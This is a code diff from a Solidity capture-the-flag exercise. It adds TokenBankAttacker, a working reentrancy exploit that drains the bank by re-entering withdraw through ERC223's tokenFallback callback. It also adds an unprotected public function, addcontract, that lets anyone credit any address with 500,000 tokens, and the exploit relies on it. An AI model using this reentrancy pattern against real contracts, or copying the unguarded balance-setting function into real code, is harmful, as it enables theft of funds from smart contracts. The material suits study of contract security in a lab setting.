@@ -108,6 +108,11 @@ contract TokenBankChallenge {
         return token.balanceOf(address(this)) == 0;
     }
 
+    /// @dev player should be a contract (this is a helper for setup)
+    function addcontract(address _contract) public {
+        balanceOf[_contract] = 500_000 * 10 ** 18;
+    }
+
     function tokenFallback(
         address from,
         uint256 value,
@@ -130,11 +135,31 @@ contract TokenBankChallenge {
 }
 
 // Write your exploit contract below
+/// @dev erc223 is vulnerable to reentrancy because it calls tokenFallback when transferring to
+/// a contract. The mistake is decremeting the balance after doing the token transfer in withdraw.
+/// This allows the attacker to call withdraw multiple times before the balance is decremented.
 contract TokenBankAttacker {
     TokenBankChallenge public challenge;
+    SimpleERC223Token public token;
 
     constructor(address challengeAddress) {
         challenge = TokenBankChallenge(challengeAddress);
+        token = challenge.token();
     }
     // Write your exploit functions here
+
+    function exploit() public {
+        challenge.addcontract(address(this));
+        challenge.withdraw(500000 * 10 ** 18);
+    }
+
+    function tokenFallback(
+        address from,
+        uint256 value,
+        bytes memory data
+    ) public {
+        if (token.balanceOf(address(challenge)) > 0) {
+            challenge.withdraw(500000 * 10 ** 18);
+        }
+    }
 }
